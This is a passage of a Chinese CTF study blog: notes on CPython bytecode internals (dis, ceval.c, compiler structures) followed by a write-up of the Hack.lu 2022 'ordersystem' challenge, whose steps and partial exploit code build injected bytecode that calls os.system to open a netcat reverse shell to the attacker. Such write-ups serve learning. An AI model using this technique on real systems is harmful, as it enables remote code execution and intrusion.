真是每个版本都不一样…. 到时候再看吧. </li></ul></li><li><code>IMPORT_NAME</code>(<em>namei</em>): Imports the module <code>co_names[namei]</code>. TOS and TOS1 are popped and provide the <em>fromlist</em> and <em>level</em> arguments of __import__(). The module object is pushed onto the stack. 实际上TOS1 不需要pop, 只要引用下然后直接修改成返回值即可. <ul><li><code>IMPORT_NAME</code>之后通常会<code>STORE_FAST</code>来暂存, 需要调用<code>os.system</code>这样的时候就<code>LOAD_FAST</code>来为<code>LOAD_METHOD</code>获取os module.</li><li>还发现了<code>IMPORT_STAR</code> <code>IMPORT_FROM</code>, 前者是从TOS上import所有symbols , 后者是从TOS上import特定, 和上面这个只import module的明显不同. </li></ul></li><li></li></ul></li><li>下面是示例, 在每个CALL_FUNCTION之前都load了函数和参数, 最终操作数为参数的个数(15行的”1”). </li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">In [<span class="hljs-number">1</span>]: <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span>():</span><br>   ...:     <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;test string&quot;</span>)<br>    <br>In [<span class="hljs-number">2</span>]: <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_test</span>():</span><br>   ...:     test()<br>   ...:     <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;test_test string&quot;</span>)<br><br>In [<span class="hljs-number">3</span>]: <span class="hljs-keyword">import</span> dis<br>In [<span class="hljs-number">4</span>]: dis.dis(test_test)<br>  <span class="hljs-number">2</span>           <span class="hljs-number">0</span> LOAD_GLOBAL              <span class="hljs-number">0</span> (test)<br>              <span class="hljs-number">2</span> CALL_FUNCTION            <span class="hljs-number">0</span><br>              <span class="hljs-number">4</span> POP_TOP<br>  <span class="hljs-number">3</span>           <span class="hljs-number">6</span> LOAD_GLOBAL              <span class="hljs-number">1</span> (<span class="hljs-built_in">print</span>)<br>              <span class="hljs-number">8</span> LOAD_CONST               <span class="hljs-number">1</span> (<span class="hljs-string">&#x27;test_test string&#x27;</span>)<br>             <span class="hljs-number">10</span> CALL_FUNCTION            <span class="hljs-number">1</span>                     <br>             <span class="hljs-number">12</span> POP_TOP                                        <br>             <span class="hljs-number">14</span> LOAD_CONST               <span class="hljs-number">0</span> (<span class="hljs-literal">None</span>)              <br>             <span class="hljs-number">16</span> RETURN_VALUE                                   <br></code></pre></div></td></tr></table></figure><ul><li><del>看了一圈我都不知道什么叫Calls the function in position 7 on the stack with the top three items on the stack as arguments.<br>4 5 6这三个位置就没用了?? 合着原来是填充. 我想我还是看看python innards比较好…..虽然是10年的post<br>然后发现在3.11的文档里是position 4. 啊这? 可能是预留位置防止后来加入东西</del><br>下面是<a href="https://github.com/python/cpython/blob/main/Python/generated_cases.c.h">cpython源码</a>. main分支上的不在<code>ceval.c</code>中, 因为case语句太长就直接分成一个单独的文件<code>generated_cases.c.h</code>, 其余版本号分支仍在ceval. 已下载cpython 3.11源码, 可以看到一些定义之类的东西.  <ul><li>exception below: <a href="https://docs.python.org/3/c-api/exceptions.html#exception-classes">python doc</a> </li><li><code>exc_info()</code>: 没看明白这是个什么东西, 只知道<code>sys.exc_info()</code>有后向兼容性, 现在更多的是使用traceback(?不确定是哪个traceback)</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//branch 3.11:</span><br>TARGET(WITH_EXCEPT_START) &#123;<br>            <span class="hljs-comment">/* At the top of the stack are 4 values:</span><br><span class="hljs-comment">               - TOP = exc_info()</span><br><span class="hljs-comment">               - SECOND = previous exception</span><br><span class="hljs-comment">               - THIRD: lasti of exception in exc_info()</span><br><span class="hljs-comment">               - FOURTH: the context.__exit__ bound method</span><br><span class="hljs-comment">               We call FOURTH(type(TOP), TOP, GetTraceback(TOP)).</span><br><span class="hljs-comment">               Then we push the __exit__ return value.</span><br><span class="hljs-comment">            */</span><br>            PyObject *exit_func;<br>            PyObject *exc, *val, *tb, *res;<br><br>            val = TOP();<br>            assert(val &amp;&amp; PyExceptionInstance_Check(val));<br>            exc = PyExceptionInstance_Class(val);<br>            tb = PyException_GetTraceback(val);<br>            Py_XDECREF(tb);<br>            assert(PyLong_Check(PEEK(<span class="hljs-number">3</span>)));<br>            exit_func = PEEK(<span class="hljs-number">4</span>);<br>            PyObject *<span class="hljs-built_in">stack</span>[<span class="hljs-number">4</span>] = &#123;<span class="hljs-literal">NULL</span>, exc, val, tb&#125;;<br>            res = PyObject_Vectorcall(exit_func, <span class="hljs-built_in">stack</span> + <span class="hljs-number">1</span>,<br>                    <span class="hljs-number">3</span> | PY_VECTORCALL_ARGUMENTS_OFFSET, <span class="hljs-literal">NULL</span>);<br>            <span class="hljs-keyword">if</span> (res == <span class="hljs-literal">NULL</span>)<br>                <span class="hljs-keyword">goto</span> error;<br><br>            PUSH(res);<br>            DISPATCH();<br>        &#125;<br><br><span class="hljs-comment">//but in branch 3.9-10:</span><br>            <span class="hljs-comment">/* At the top of the stack are 7 values:</span><br><span class="hljs-comment">               - (TOP, SECOND, THIRD) = exc_info()</span><br><span class="hljs-comment">               - (FOURTH, FIFTH, SIXTH) = previous exception for EXCEPT_HANDLER</span><br><span class="hljs-comment">               - SEVENTH: the context.__exit__ bound method</span><br><span class="hljs-comment">               We call SEVENTH(TOP, SECOND, THIRD).</span><br><span class="hljs-comment">               Then we push again the TOP exception and the __exit__</span><br><span class="hljs-comment">               return value.</span><br><span class="hljs-comment">            */</span><br></code></pre></div></td></tr></table></figure><h3 id="Python-backgrounds-amp-Innards"><a href="#Python-backgrounds-amp-Innards" class="headerlink" title="Python backgrounds &amp; Innards"></a>Python backgrounds &amp; Innards</h3><p>一些太通用的东西挪到这里来了.</p><blockquote><p>关于python编译系统内部原理的一些链接, 暂时可以不用关注: (不看啥也不知道, 又滚回来看了…</p><ul><li>stackoverflow: <a href="https://stackoverflow.com/questions/3299648/python-compilation-interpretation-process">bytecode instance</a> | <a href="https://stackoverflow.com/questions/19916729/how-exactly-is-python-bytecode-run-in-cpython">theory</a>. 一篇巨长的<a href="https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d">文章</a>, 连指令都全部列出来. </li><li>Wiki: <a href="https://en.wikipedia.org/wiki/Stack_machine">stack machine</a> vs. register machine<ul><li><a href="https://www.geeksforgeeks.org/computer-organization-instruction-formats-zero-one-two-three-address-instruction/">Instruction formats</a> are classified into different types depending upon the CPU organization. <a href="https://www.geeksforgeeks.org/introduction-of-stack-based-cpu-organization/">CPU organization</a> is again classified into three types based on internal storage: <strong>Stack machine</strong>, Accumulator machine, General purpose organization or General register.</li><li>Stack machines extend <a href="https://en.wikipedia.org/wiki/Push-down_automata">push-down automata</a>(下推自动机) with additional load/store operations or multiple stacks and hence are Turing-complete. </li><li>开始看到上下文无关语法等等, 快死去的记忆开始攻击我. 一时看不完wiki, 找点浅显易懂的文章来. <a href="https://users.ece.cmu.edu/~koopman/stack_computers/sec3_2.html">stackmachine book</a> | <a href="https://www.geeksforgeeks.org/stack-machine-in-computer-organisation/">Geek</a> </li></ul></li><li><a href="https://devguide.python.org/internals/compiler/index.html">python compiler design</a> : developer官方文档, 这里面好多, 但是看起挺有用…..看了也不知道说啥. 还是看他的reference文章.</li><li><a href="https://tech.blog.aknin.name/category/my-projects/pythons-innards/">python innards</a> : 讲解ceval.c内容. <ul><li><a href="https://tech.blog.aknin.name/2010/04/02/pythons-innards-introduction/">innards introduction</a> 前置知识, 溜一遍. 可惜就是十年前的终究有点过时. </li></ul></li><li>还可以看看python <a href="https://docs.python.org/3/c-api">C API</a>. </li><li>还可以看看python reference的<a href="https://docs.python.org/3.11/reference/datamodel.html#the-standard-type-hierarchy">data model</a> </li></ul></blockquote><p>真的好乱, 看到啥记下啥了.</p><h4 id="Misc"><a href="#Misc" class="headerlink" title="Misc:"></a>Misc:</h4><ul><li><p>The function definition’s body is compiled into a <u><strong>code object.</strong></u> Then the function definition itself is compiled into code (inside the enclosing function body, module, etc.) that, when executed, builds a function object from that code object. (Once you think about how closures must work, it’s obvious why it works that way. Each instance of the closure is a separate function object with the same code object.)</p></li><li><p>dis module: <a href="https://docs.python.org/3.10/library/dis.html#python-bytecode-instructions">bytecode instructions</a> </p><ul><li><p><em>Changed in version 3.6:</em> Use 2 bytes for each instruction. Previously the number of bytes varied by instruction.</p><p><em>Changed in version 3.10:</em> The argument of jump, exception handling and loop instructions is now the <strong>instruction offset</strong> rather than the byte offset.</p></li></ul></li><li><p>get information about live objects: <a href="https://docs.python.org/3/library/inspect.html#module-inspect">Inspect</a> </p><ul><li><a href="https://docs.python.org/3/library/inspect.html#types-and-members">Types and members</a> :<code>function.__code__.co_code</code> to get code bytestring or <code>inspect.getmembers([func/module/class])</code> to see all members.</li></ul></li></ul><ul><li><p>python built-in function: <code>eval</code> &amp; <code>exec</code>. <a href="https://stackoverflow.com/questions/2220699/whats-the-difference-between-eval-exec-and-compile">difference</a>: <code>eval</code> accepts only a <strong>single expression</strong>, <code>exec</code> can take a code block</p></li><li><p><strong>METHOD</strong> </p><ul><li>python的method是指在class里的, 而function就是字面意思. </li><li><em>bound methods</em>: a function is an attribute of class and it is accessed via the instances(common case)</li><li><em>unbound methods</em>: Methods that do not have an instance of the class as the first argument. As of Python 3.0, the unbound methods <strong>have been removed from the language</strong>. They are not bounded with any specific object of the class. To make the method work it should be made into a <strong>static method</strong>. </li></ul></li><li><p>use decorator<code>@staticmethod</code> or <code>staticmethod()</code>.</p></li><li><p><strong>PyObject</strong>:</p><ul><li>All Python objects ultimately <strong>share a small number of fields</strong> at the beginning of the object’s representation in memory. 这些字段就是指的<strong>PyObject</strong>, 所有object type都是该类型的扩展, 而且对外<strong>只使用<code>PyObject*</code>这种类型</strong>. </li><li><strong>PyVarObject</strong> is an extension of <a href="https://docs.python.org/3/c-api/structures.html#c.PyObject"><code>PyObject</code></a> that adds the <code>ob_size</code> field. This is only used for objects that have some notion of <em>length</em>. 比如说<code>PyTupleObject</code>的头部就是一个<code>PyVarObject ob_base</code>. </li><li><code>co_names</code>是PyTuple类型的, 使用<code>names = PyTuple_New(n);</code>进行初始化. </li></ul></li><li><p><a href="https://docs.python.org/3.11/reference/datamodel.html#objects-values-and-types">Data model</a> </p><ul><li><strong><u>Module</u></strong>: A module object has a <strong>namespace</strong> implemented by a <strong>dictionary</strong> object (this is the dictionary referenced by the <code>__globals__</code> attribute of functions defined in the module). Attribute references are translated to lookups in this dictionary, e.g., <code>m.x</code> is equivalent to <code>m.__dict__[&quot;x&quot;]</code>. A module object does not contain the code object used to initialize the module (since it isn’t needed once the initialization is done).</li><li><u><strong>Function</strong></u>: 不是很重要. </li><li><strong><u><em>Objects</em></u></strong> are Python’s abstraction for data. Every object has an identity, a type and a value. An object’s type determines the operations that the object supports (e.g., “does it have a length?”) and also defines the possible values for objects of that type.</li></ul></li></ul><hr><blockquote><p>除了python innards, <a href="https://realpython.com/cpython-source-code-guide">这一篇</a>三年前写的比较新一点. 还有一些图解, 真不错. </p></blockquote><h4 id="Intro-amp-AST"><a href="#Intro-amp-AST" class="headerlink" title="Intro &amp; AST"></a>Intro &amp; AST</h4><ul><li><p>src structure(in Linux platform)</p><ul><li>Include — header files</li><li>Objects — object implementations, from int to type</li><li>Python — interpreter, bytecode compiler and other essential infrastructure</li><li>Parser — parser, lexer and parser generator</li><li>Modules — stdlib extension modules, and main.c </li><li>Programs — not much, but has the real main() function</li></ul><blockquote><p>when it comes to modern windows, lookup <code>PCBuild — Tools to build Python for modern Windows using Visual Studio</code> </p></blockquote></li><li><p>一时不知道要看哪个…先看看最新的这个吧. </p></li><li><p>Grammar is written in BNF. <a href="https://en.m.wikipedia.org/wiki/Backus%E2%80%93Naur_form">https://en.m.wikipedia.org/wiki/Backus%E2%80%93Naur_form</a> </p></li><li><p>解释器工作流程:</p></li></ul><img src="../../image/recent_ctf/swim-lanes-chart-1.9fb3000aad85.png" alt="Python run swim lane diagram" style="zoom: 67%;" /><ul><li>AST直接跳过了, 看看object type之类的定义. 就比如stack其实是<code>PyObject *</code>类型的一样. </li><li>The <a href="https://github.com/python/cpython/blob/d93605de7232da5e6a182fd1d5c220639e900159/Python/compile.c#L312"><code>PyAST_CompileObject()</code></a> function is the main entry point to the CPython compiler. </li><li>But before the compiler starts, a global compiler state is created</li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">compiler</span> &#123;</span><br>    PyObject *c_filename;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">symtable</span> *<span class="hljs-title">c_st</span>;</span><br>    PyFutureFeatures *c_future; <span class="hljs-comment">/* pointer to module&#x27;s __future__ */</span><br>    PyCompilerFlags *c_flags;<br><br>    <span class="hljs-keyword">int</span> c_optimize;              <span class="hljs-comment">/* optimization level */</span><br>    <span class="hljs-keyword">int</span> c_interactive;           <span class="hljs-comment">/* true if in interactive mode */</span><br>    <span class="hljs-keyword">int</span> c_nestlevel;<br>    <span class="hljs-keyword">int</span> c_do_not_emit_bytecode;  <span class="hljs-comment">/* The compiler won&#x27;t emit any bytecode</span><br><span class="hljs-comment">                                    if this value is different from zero.</span><br><span class="hljs-comment">                                    This can be used to temporarily visit</span><br><span class="hljs-comment">                                    nodes without emitting bytecode to</span><br><span class="hljs-comment">                                    check only errors. */</span><br><br>    PyObject *c_const_cache;     <span class="hljs-comment">/* Python dict holding all constants,</span><br><span class="hljs-comment">                                    including names tuple */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">compiler_unit</span> *<span class="hljs-title">u</span>;</span> <span class="hljs-comment">/* compiler state for current block */</span><br>    PyObject *c_stack;           <span class="hljs-comment">/* Python list holding compiler_unit ptrs */</span> <span class="hljs-comment">//notice this line!!!!!!!!!!!!!!!!!</span><br>    PyArena *c_arena;            <span class="hljs-comment">/* pointer to memory allocation arena */</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>then PyAST_CompileObject does the following things:<ul><li>some flag initializations … </li><li>Build a <strong>symbol table</strong> from the module object.</li><li><strong>Run the compiler</strong> with the compiler state and <strong>return the code object</strong>.</li><li>Free any allocated memory by the compiler.</li></ul></li></ul><h4 id="symbol-table"><a href="#symbol-table" class="headerlink" title="symbol table"></a>symbol table</h4><ul><li>In <a href="https://github.com/python/cpython/blob/d93605de7232da5e6a182fd1d5c220639e900159/Python/compile.c#L312"><code>PyAST_CompileObject()</code></a> there was a reference to a <code>symtable</code> and a call to <a href="https://github.com/python/cpython/blob/d93605de7232da5e6a182fd1d5c220639e900159/Python/symtable.c#L262"><code>PySymtable_BuildObject()</code></a> with the module to be executed. The purpose of the symbol table is to provide a list of namespaces, globals, and locals for the compiler to use for referencing and resolving scopes. </li><li>…</li></ul><h4 id="Core-Compilation-Process"><a href="#Core-Compilation-Process" class="headerlink" title="Core Compilation Process"></a>Core Compilation Process</h4><ul><li>Now that the <a href="https://github.com/python/cpython/blob/d93605de7232da5e6a182fd1d5c220639e900159/Python/compile.c#L312"><code>PyAST_CompileObject()</code></a> has a compiler state, a symtable, and a module in the form of the AST, the actual compilation can begin.</li><li>in cpython 3.11 branch, the PyCodeObject is in <code>Include\cpython\code.h</code> and is a macro. </li><li>放弃了, 暂时没帮助的编译细节. </li></ul><h4 id="Assembly"><a href="#Assembly" class="headerlink" title="Assembly"></a>Assembly</h4><p>如名, 没啥特别的.</p><h4 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a><a href="https://realpython.com/cpython-source-code-guide/#conclusion_2">Conclusion</a></h4><p>编译大致过程, 知道这个就行了</p><h4 id="Execution"><a href="#Execution" class="headerlink" title="Execution"></a><a href="https://realpython.com/cpython-source-code-guide/#execution">Execution</a></h4><ul><li>This stage forms the execution component of CPython. Each of the bytecode operations is taken and executed using a “Stack Frame” based system.</li><li>Before a frame can be executed, it needs to be referenced from a thread. CPython can have many threads running at any one time within a single interpreter. An Interpreter state <strong>includes a list of those threads as a linked list</strong>. The thread structure is called <strong><a href="https://github.com/python/cpython/blob/d93605de7232da5e6a182fd1d5c220639e900159/Include/pystate.h#L23"><code>PyThreadState</code></a></strong>, and there are many references throughout <code>ceval.c</code>.</li></ul><h4 id="Frame-Execution"><a href="#Frame-Execution" class="headerlink" title="Frame Execution"></a>Frame Execution</h4><ul><li>Frames are executed in the main execution loop inside <a href="https://github.com/python/cpython/blob/d93605de7232da5e6a182fd1d5c220639e900159/Python/ceval.c#L745"><code>_PyEval_EvalFrameDefault()</code></a>. This function is central function that brings everything together and brings your code to life. It contains decades of optimization since even a single line of code can have a significant impact on performance for the whole of CPython.</li></ul><h4 id="The-Value-Stack"><a href="#The-Value-Stack" class="headerlink" title="The Value Stack"></a><a href="https://realpython.com/cpython-source-code-guide/#the-value-stack">The Value Stack</a></h4><p>我想看到的东西. </p><ul><li><code>PyObject **stack_pointer</code>指向栈顶的上一个位置. </li><li>switch in ceval.c:<ul><li>any operation that fails must <code>goto error</code>, all operation that succeed call <code>DISPATCH()</code> </li><li><code>DISPATCH()</code>:  if tracing is enabled, do the trace, if tracing is not enabled, a <code>goto</code> is called to <code>dispatch_opcode</code>, which jumps back to the top of the loop for the next instruction.</li><li><code>PREDICT()</code> macro will do the same as it says. When the prediction succeeds, it means execution flow haven’t to go through the loop again. </li></ul></li><li>Some of the operations, such as <code>CALL_FUNCTION</code>, <code>CALL_METHOD</code>, have an operation argument referencing another compiled function. In these cases, <strong>another frame is pushed to the frame stack in the thread</strong>, and the evaluation loop is run for that function until the function completes. <strong>Each time a new frame is created and pushed onto the stack, the value of the frame’s <code>f_back</code> is set to the current frame before the new one is created</strong>. </li></ul><h3 id="ordersystem-wp1-wp2"><a href="#ordersystem-wp1-wp2" class="headerlink" title="ordersystem wp1 wp2:"></a>ordersystem <a href="https://enoflag.github.io/writeups/hacklu2022/ordersystem/">wp1</a> <a href="https://qwerty-po.notion.site/Hack-lu-2022-Writeup-03ddbe17de6c47629d755998a5d6e411">wp2</a>:</h3><h4 id="src"><a href="#src" class="headerlink" title="src"></a>src</h4><ul><li>用字典类型<code>ENTRIES</code>来保存输入的信息. 其中key最多12字节, 可以是任意bytes, 但是data只能是printable hex number, 长度为0-255.</li><li>可保存data到storage文件夹中的key.decode或者key.hex(作为文件名称), <strong>还可以</strong>directory traversal到plugins文件夹中. </li><li>执行plugins时读取相应bytecode文件, 将所有key加上<code>plugin_log(msg,filename=&#39;./log&#39;,raw=False)</code>放到codeType的consts中, <strong>将bytecode后面使用分号隔开的bytes放到names中</strong>.<br>其中log函数可做到将第一个参数的内容(无限制)写入<code>./log</code>文件. 最后<code>exec()</code>执行代码. <strong>但是</strong>, 注意调用log函数时第一个参数msg只能是来自co_const, 而consts又是从key中获取. </li></ul><p>docker安装的python版本是3.10.6</p><h4 id="problem"><a href="#problem" class="headerlink" title="problem"></a>problem</h4><ul><li><p>because of the hexdump executed by server, we can only send printable hex numbers, which dramatically lessens our options.<br>notice that the code in block is actually a condition statement……….</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">In [<span class="hljs-number">1</span>]: <span class="hljs-keyword">import</span> dis<br>   ...: &#123;<br>   ...:     <span class="hljs-built_in">hex</span>(op_code): op_name<br>   ...:     <span class="hljs-keyword">for</span> op_name, op_code <span class="hljs-keyword">in</span> dis.opmap.items()<br>   ...:     <span class="hljs-keyword">if</span> <span class="hljs-built_in">chr</span>(op_code) <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;0123456789abcdef&quot;</span><br>   ...: &#125;<br>Out[<span class="hljs-number">1</span>]:<br>&#123;<span class="hljs-string">&#x27;0x31&#x27;</span>: <span class="hljs-string">&#x27;WITH_EXCEPT_START&#x27;</span>,<br> <span class="hljs-string">&#x27;0x32&#x27;</span>: <span class="hljs-string">&#x27;GET_AITER&#x27;</span>,<br> <span class="hljs-string">&#x27;0x33&#x27;</span>: <span class="hljs-string">&#x27;GET_ANEXT&#x27;</span>,<br> <span class="hljs-string">&#x27;0x34&#x27;</span>: <span class="hljs-string">&#x27;BEFORE_ASYNC_WITH&#x27;</span>,<br> <span class="hljs-string">&#x27;0x36&#x27;</span>: <span class="hljs-string">&#x27;END_ASYNC_FOR&#x27;</span>,<br> <span class="hljs-string">&#x27;0x37&#x27;</span>: <span class="hljs-string">&#x27;INPLACE_ADD&#x27;</span>,<br> <span class="hljs-string">&#x27;0x38&#x27;</span>: <span class="hljs-string">&#x27;INPLACE_SUBTRACT&#x27;</span>,<br> <span class="hljs-string">&#x27;0x39&#x27;</span>: <span class="hljs-string">&#x27;INPLACE_MULTIPLY&#x27;</span>,<br> <span class="hljs-string">&#x27;0x61&#x27;</span>: <span class="hljs-string">&#x27;STORE_GLOBAL&#x27;</span>,<br> <span class="hljs-string">&#x27;0x62&#x27;</span>: <span class="hljs-string">&#x27;DELETE_GLOBAL&#x27;</span>,<br> <span class="hljs-string">&#x27;0x63&#x27;</span>: <span class="hljs-string">&#x27;ROT_N&#x27;</span>,<br> <span class="hljs-string">&#x27;0x64&#x27;</span>: <span class="hljs-string">&#x27;LOAD_CONST&#x27;</span>,<br> <span class="hljs-string">&#x27;0x65&#x27;</span>: <span class="hljs-string">&#x27;LOAD_NAME&#x27;</span>,<br> <span class="hljs-string">&#x27;0x66&#x27;</span>: <span class="hljs-string">&#x27;BUILD_TUPLE&#x27;</span>&#125;<br></code></pre></div></td></tr></table></figure></li><li><p>but the <code>WITH_EXCEPT_START</code> is something special. </p><blockquote><p><code>WITH_EXCEPT_START</code>: Calls the function in position 7 on the stack with the top three items on the stack as arguments. Used to implement the call <code>context_manager.__exit__(*exc_info())</code> when an exception has occurred in a <a href="https://docs.python.org/3.10/reference/compound_stmts.html#with">with</a> statement.</p></blockquote><ul><li><a href="https://docs.python.org/3.10/reference/compound_stmts.html#with">with statement</a>(有更多东西) | <a href="https://docs.python.org/3.10/library/stdtypes.html#typecontextmanager">context manager</a> </li><li>通过with语句的流程看出来貌似在with_statement evaluate之后的值自带manager, 比如open()返回的file object中就有<code>__enter__</code>函数, 而且enter也不需要做什么就直接返回file object. 而<code>__exit__</code>就是直接调用close()</li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* At the top of the stack are 7 values:</span><br><span class="hljs-comment">   - (TOP, SECOND, THIRD) = exc_info()</span><br><span class="hljs-comment">   - (FOURTH, FIFTH, SIXTH) = previous exception for EXCEPT_HANDLER</span><br><span class="hljs-comment">   - SEVENTH: the context.__exit__ bound method</span><br><span class="hljs-comment">   We call SEVENTH(TOP, SECOND, THIRD).</span><br><span class="hljs-comment">   Then we push again the TOP exception and the __exit__</span><br><span class="hljs-comment">   return value.</span><br><span class="hljs-comment">*/</span><br></code></pre></div></td></tr></table></figure></li></ul><p>下面这个流程也是不断的修改之后才成功的……</p><ol><li>Calculate proof of work to get the real target port, 使用docker完全见不到. </li><li>Craft python bytecode which will spawn a reverse shell to the attacker’s machine as <code>exp_bc</code>  </li><li>Divide <code>exp_bc</code> into chunks of 12 bytes</li><li>Upload the filling consts to 0x30 items. </li><li>Upload num_chunk plugins and <code>dump()</code> </li><li>Store <code>exp_bc</code> as keys in the storage</li><li>Run one plugin for each chunk which appends the key to the logfile aka exploit plugin</li><li>Upload nc command string. </li><li>Run the exploit plugin</li></ol><h4 id="proof-of-work"><a href="#proof-of-work" class="headerlink" title="proof of work"></a>proof of work</h4><p>?</p><h4 id="reverse-shell"><a href="#reverse-shell" class="headerlink" title="reverse shell"></a>reverse shell</h4><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># This is the index where we will later store the nc command</span><br>nc_index = <span class="hljs-number">55</span><br>co_names = [<span class="hljs-string">&quot;len&quot;</span>, <span class="hljs-string">&quot;list&quot;</span>, <span class="hljs-string">&quot;print&quot;</span>, <span class="hljs-string">&quot;os&quot;</span>, <span class="hljs-string">&quot;system&quot;</span>, <span class="hljs-string">&quot;decode&quot;</span>]<br>exploit_asm = [<br>    <span class="hljs-comment"># Get length of empty list to push 0 on the stack</span><br>    (<span class="hljs-string">&quot;BUILD_LIST&quot;</span>, <span class="hljs-number">0</span>),<br>    <span class="hljs-comment"># Use NOP as arg to simplify compiler ?????what is nop?? 不就是压入了一个long类型的0吗, 这个指令不需要参数.</span><br>    (<span class="hljs-string">&quot;GET_LEN&quot;</span>, <span class="hljs-number">0x09</span>),<br>    <span class="hljs-comment"># Invoke print() to push None onto the stack</span><br>    (<span class="hljs-string">&quot;LOAD_NAME&quot;</span>, co_names.index(<span class="hljs-string">&quot;print&quot;</span>)),<br>    (<span class="hljs-string">&quot;CALL_FUNCTION&quot;</span>, <span class="hljs-number">0</span>),<br>    <span class="hljs-comment"># Import os</span><br>    (<span class="hljs-string">&quot;IMPORT_NAME&quot;</span>, co_names.index(<span class="hljs-string">&quot;os&quot;</span>)),<br>    <span class="hljs-comment"># Invoke os.system()</span><br>    (<span class="hljs-string">&quot;LOAD_METHOD&quot;</span>, co_names.index(<span class="hljs-string">&quot;system&quot;</span>)),<br>    <span class="hljs-comment"># Decode first batch of nc command</span><br>    (<span class="hljs-string">&quot;LOAD_CONST&quot;</span>, nc_index),<span class="hljs-comment">#load了一个string object, 所以可以在他之上调用decode函数.</span><br>    (<span class="hljs-string">&quot;LOAD_METHOD&quot;</span>, co_names.index(<span class="hljs-string">&quot;decode&quot;</span>)),<br>    (<span class="hljs-string">&quot;CALL_METHOD&quot;</span>, <span class="hljs-number">0</span>),<br>    <span class="hljs-comment"># Decode second batch of nc command</span><br>    (<span class="hljs-string">&quot;LOAD_CONST&quot;</span>, nc_index + <span class="hljs-number">1</span>),<br>    (<span class="hljs-string">&quot;LOAD_METHOD&quot;</span>, co_names.index(<span class="hljs-string">&quot;decode&quot;</span>)),<br>    (<span class="hljs-string">&quot;CALL_METHOD&quot;</span>, <span class="hljs-number">0</span>),<br>    <span class="hljs-comment"># Decode third batch of nc command</span><br>    (<span class="hljs-string">&quot;LOAD_CONST&quot;</span>, nc_index + <span class="hljs-number">2</span>),<br>    